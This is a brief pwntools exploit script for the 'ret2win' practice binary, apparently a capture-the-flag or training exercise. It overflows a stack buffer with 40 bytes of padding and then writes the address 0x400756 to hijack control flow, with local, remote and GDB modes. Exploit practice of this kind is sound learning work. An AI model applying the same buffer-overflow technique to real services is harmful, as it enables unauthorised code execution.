from pwn import *

elf = context.binary = ELF('./ret2win')
context.terminal = ['tmux', 'splitw', '-h']
if args.REMOTE:
    conn = remote("n/A", 10305)
elif args.GDB:
    conn = gdb.debug([elf.path], gdbscript='''
    b pwnme 
    c
    ''')
else:
    conn = elf.process()
conn.recvuntil(b"read()!")
conn.recv()
f = b"a" * 40
indi = p64(0x400756)
conn.sendline(f + indi)

conn.interactive()